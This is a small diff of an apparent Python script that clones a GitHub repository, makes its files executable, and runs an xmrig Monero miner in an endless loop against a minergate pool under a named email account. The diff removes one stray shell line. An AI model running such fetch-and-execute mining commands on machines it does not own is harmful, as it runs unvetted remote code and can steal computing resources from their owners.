@@ -7,7 +7,6 @@ os.system('git clone https://github.com/quincyhays/bmxmrig')
 sleep(2)
 os.system('cd /bmxmrig && chmod +x *')
 sleep(2)
-cd bmxmrig && chmod +x *
 while(True):
 	os.system('clear')
 	os.system('cd bmxmrig && timeout 3000 ./xmrig -o xmr.pool.minergate.com:45700 -u gday20719@gmail.com')
